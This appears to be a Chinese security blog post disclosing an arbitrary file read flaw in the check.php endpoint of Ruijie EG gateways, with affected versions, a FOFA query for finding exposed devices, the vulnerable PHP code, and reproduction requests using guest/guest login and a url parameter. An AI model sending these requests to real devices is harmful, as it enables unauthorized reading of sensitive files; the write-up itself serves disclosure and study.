---
title: "锐捷-EWEB check.php 文件读取漏洞"
source: https://mrxn.net/jswz/ruijieweb-check-fileread.html
asset_dir: assets/锐捷-eweb-check.php-文件读取漏洞
---

# 锐捷-EWEB check.php 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/4/27 08:25
* 1142浏览
* [0评论](#comment)
* 15分钟阅读

深入探索

身份验证

SQL

鉴权


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

锐捷EG易网关是一款综合网关，由锐捷网络完全自主研发。它集成了先进的软硬件体系架构，配备了DPI深入分析引擎、行为分析/管理引擎，可以在保证网络出口高效转发的条件下，提供专业的流控功能、出色的URL过滤以及本地化的日志存储/审计服务。锐捷EG易网关 `check.php` 的 `indexAction` 存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞，攻击者可以利用该[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)读取设备上任意文件内容，造成敏感信息泄露。

漏洞预警服务

# 影响版本

<=2022.07.28.01

# fofa语法

> `title="锐捷网络-EWEB网管系统" || app="Ruijie-EG易网关" && body="/login.php?a=version"`

# 漏洞分析

看下 `check.php` 关键业务 `indexAction` 逻辑的实现

```
public function indexAction() {
        $root = "/tmp/html/";
        $name = $_GET["url"];
        $url = $root.$name;
        if($name == FALSE){
            header("Location: /index.htm");
            exit();
        }
        if (file_exists($url)) {
            $fileContent = file_get_contents($url);
            echo $fileContent;
        } else if (file_exists($url.".gz")) {
            header("Content-Encoding: gzip");
            $fileContent = file_get_contents($url.".gz");
            echo $fileContent;
        } else {
            echo "404 Resource Not Found";
        }
    }
```

深入探索

安全研究报告

文本剥离工具

云安全解决方案

用户输入的 `$_GET["url"]` 参数被直接赋值给 `$name` 变量，然后拼接成 `$url = $root . $name`，其中 $root 为固定值 "/tmp/html/"。未对 `$name` 进行任何过滤或验证，因此攻击者可以通过在 `$name` 中注入目录遍历序列（如 "../"）来访问系统中的任意文件，绕过预设的根目录限制，因此造成任意[文件读取漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)。

# 漏洞复现

## 获取cookie

```
POST /ddi/server/login.php HTTP/1.1
Host: ruijieweb.mrxn.ent
Content-Type: application/x-www-form-urlencoded

username=guest&password=guest?
```

[![锐捷-EWEB check.php 文件读取漏洞](images/img-001-489e6f4b63e4.webp)](https://image.mrxn.net/e2433a412d6049e3b49ff42339f02422.webp)

## 读取文件

```
GET /check.php?url=check.php HTTP/1.1
Host: ruijieweb.mrxn.net
Content-Type: application/x-www-form-urlencoded
Cookie: RUIJIEID=xxxxxxxxxxl855hve3xxxxxxxx
X-Requested-With: XMLHttpRequest
Accept-Encoding: gzip
```

[![锐捷-EWEB check.php 文件读取漏洞](images/img-002-d4af1f55b7b1.webp)](https://image.mrxn.net/2992ce1ab7374f7dae6d2d3c5103fa38.webp)

成功读取到 `check.php` 内容

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.获取cookie](#toc-5-1-)
* [5.2.读取文件](#toc-5-2-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[锐捷-EWEB check.php 文件读取漏洞](https://mrxn.net/jswz/ruijieweb-check-fileread.html)  
文章链接：<https://mrxn.net/jswz/ruijieweb-check-fileread.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

漏洞预警服务

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKO0lEQVR4AeycgXLbOAxE8/r//9zzClkSISFZTuzI02Mn6IKLBUgTgp3kbvrn4+Pj70/t7+efozqfkg2OdDm2iW9/mbu57ctcRgczZ/8oZo3QuoziR8tx+WP8u2s15Ja7vt7lBlpDbl3+eMSOXkCuc6Q7G3O9rK84xx0TmjuLwAd8NdUZDUJT1R2199a5RmtIJpd/3Q1MDYHoPNR4dFQ/CdBzK841HNtD6HUAp+0iMD3du+JbwPve3Jd8wXwe6Fy16dSQSrS437uB1ZDfu+tTOz21IRDjWO3st4eMEHqo0XWc4/Uj6FyIPXIuzFyOX+E/tSFXvIB/bc+XNMRPpdAXBvE0AqZKVM5opfCTHLVaf4Y2ALYP+m3xxL+0j+yJJbdSL2nIx1Z6/fWdG1gN+c6tvTBnaojG8MjOnAXibQI65jwIPnOVD191EGugkpfc+FpKUUHmPGB724MZi9RG5RqV34TJmRqSYsu94AZaQ2DuPuxzR2fNT4N1ZznrzyL0Mx7lQOh+co4qt9oTYi84h7lGa0gml3/dDayGXHf35c5/8hh+13dl53st/Amn/Hvm+kKItwj5tjEfQgO0ENA+tJ0HnbMQOmedY17/FNeE+EbfBA8bAvFEVGeFiAFVuHHA9vQ1IjkQMSCx3fXTBuzW6Orag8h1rYzOyBzs67POuRVC1IAZsx7m+GFDcvIb+P+LI/yB6JJfLcQaaP9J1zEhRLx6WiBi0tmsg4hBR2uE0Hn46is+GnzVQD8v9NiYl9c+W+bsQ68B4TsmhOBgRtfNqBwZdL3Wo60JGW/k4vVqyMUNGLdv3/ZCjNIo2FtD6KFjpYWI55hHueIcqzDr7WddxTkO8zmsz2h9hRA1oL89OjfrzUHXm6sw564JqW7oQm5qSO7W0bkqnbkqzzEhxJOTdRAczJh19lVH5rUQIlf+dw3mGhCc9rM9Wr/Kq7ipIY9utPTPvYHVkOfe54+rnWoIxMgCbUNg++kZ+gccBNdEyYGIAY31yApNyh+tipkD2jnMVeiaMOuhc5Wu4iByvBfEGjo6TwjBy7dVuaca4sR/Et/sRU0NgegkdMxndnczQmizbvSz3n7WVFyOy4fYB9ByM+cJN+L2F9CmBsK/0ae+YF+vPWxjMfMZR824htgr50wNGZPW+ndvYDXkd+/77m5TQ/L4VNkQYwYdc4586LGzNSBysh6Cg8AcO+vrPLJKD1FX8SNzLoQe+jcyzoMesz6jdZmzDz13aohFC6+5gfbr96MO5qNZlxF6h2F+eqSFrsn1Rh/2dapjg66D8B3LNSFiEGiN0DqIGGDqyzcFJpVjAzaNYxlhjsHMuVbGNSH5Jt/AXw15gybkI7Rfv5uEGC3AVInANrJAi3v0gBaD8JvoBw5ELaBV8Z5CYNtXvs1CryE0cPzW6ryz6PrCszkQZ8n6NSH5Np7nf7vSYUPUbVmuDtFV8bYcl29eqPVo4s+Y86z1Wlhx4kc7qxvzHl1D3AtwmApsUwx9QqFzhw05rLyCL7mB9m3v2ep+4qB3deSqWtYIq3jFSSurYtD3h/CllUGsYcZcCyKeOeXLMlf50shgvwZEDPo0KMcGEc/114Tk23gDfzXkDZqQj9AaAjE+HidhFtqHWQdfOYg14LT2QQYc+i0hORA5iWquzmkz6fU9tB6iPmCq/U+CqmESaGc3p/hoELrMW5/R8cy1hmRy+dfdwNQQiO4Ch6cC2tNSdfowuQge1XCswqJUOxcwhYEWdzDXhR6H8K3LCBGDGV0v6+3DrHdMODVE5LLrbmA15Lq7L3duv8uqxqzM+CStF35S01uBeMVHE79ncDzSe3niIXLzfhCc4j+1XNe1zHl9D60XVto1IdWtXMi1n9RhfpIgOHXT5rNCxABTJQLb5OTgWEsxCJ1jGSFi0tlg5hzL6DoQeq+FWXfkQ+RCR+XLIDj5NteCiEGN1jlPuCbEt/ImuBryJo3wMVpDNC6jWZRx1GgNMZJZ96ivOjKIWtBRvCzX1FoGXZfjoy+tbOS1hl5DmjOmPJm18h8150LfvzXk0WJL/5obaN/2ujz0bj3KuePOu4fWCyH2lW87yod9PUQMjrGqD3OOdTDHYOas9+vYQ+syrgnJt/EGfmsIRKdzN4/Ol3X2IWrkPMcyd9Z3LkRd6OhYVcux76Dr5VyIfR0TOi5f5rVQ69FgrgHBKcfWGjIWeN16VT66gdWQo9u5INYa4pGBGCOgPA6w/eQNM7pGRheBrq845ziW0bGMEPUqXebgqw5iDR2z3j7M8Xv7O7dC51Yx6Hu1hlTCxf3+DbTfZVVbu6sZrcucfcegdxzCd0wIj3Ew61VnNNjXQcR8VuGY/5216shyLsRemat85Y22JqS6qQu51ZALL7/aujUEHhszCD3MOI7huPZBRl5r6PVGnddCaWXyz5i0sqzVWgZ9T61llS5z9iFyvX4EYc5tDXmk0NK+7gam32Xp6bBV20J01ZoKITRAKwG0b5cbWThVPcvgXA2YdRCca+0h7OsgYsCUDpx6fVPijYCe+89MyO11/RNfqyFv1sb2c4jfKqrzQR8p66BzEP5Rbo65RuYqHx6rW9Uw5z0hakJHazJaL4TQyrdZ63WF1gghasg/sjUhR7dzQWz6UL93BohO5yfCORAxrzNW+hyHyIWOjkNwXu+h96jiEDWsEVonfzQIPWBZicD2YZ6DEBx0zHH7455arwnx7bwJroa8SSN8jPahbgLOjRl0nUZN5hrybeag683dQ9cwVnqY61ovdI58GXS91jLoHIQvfjSIGOCyDYHtrQtoXHZcC2g6mP01IfnW3sCfPtTdSaHPJ992xDkGvfNjnjTQ4xC+dRmllUFo5Nuyzj7s62COQXDOF7o+RAwwVaJy9qxMuEOuCTm8oN8Pts8Q4PC9DfbjPnb1pEDkWSO0Tr4NZh3MnPVHCJEHTDLvnTGLMm8f2O7Ga2HOkQ+hAbR8yFTPtibkoat7vXg15PV3/NAOrSEembN4tAuwjTj0f8Eg6yHi1V5ZV8XNWQdRCzD1BYHtLM6DWANNB2wa6NiCJx3XF55MaTLo+7aGtOhyLr2BqSHQuwWzf+a0ekpsEDVy3hgDcrj5wPbkNqJwXEvosPzR4H4t5z+CEHVhxqpOPpfjmZsaYtHCa25gNeSae9/d9akNgRjbvJvHMXOVD5ELHSudOQid10LvBRGDjorLrBFCxOWPJu1oEHpgDH1Zu1Ymge3tFzpWuqc2JB9g+fs3cBR5akOqjkM8EY4Jjw6kuO2MDqI+cCRv/7oP0J7Uah/ocQjfha2/h9ZndE7m7EPsA3w8tSEf68+Pb2A15MdX+NwCU0M8Wnt4ZnvoI2g9zJxjQu8HXTdy0tkgdNYIHZNvM2c0L4So4ZhQvEy+TWsZhB7OoXJsYy3xEHXk26aGOHHhNTfQGgLRLTiHR8d1tzNmPcQemat82Ne5NoQGqEo0Dmgf5hD+ozVaseS4RqKaC7EPdGzBHac1ZCe+6F++gdWQX77we9v9BwAA//9fAhyaAAAABklEQVQDAKT4BLBgsbHcAAAAAElFTkSuQmCC)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/ruijieweb-check-fileread.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

网络安全

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/ruijieweb-check-fileread.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 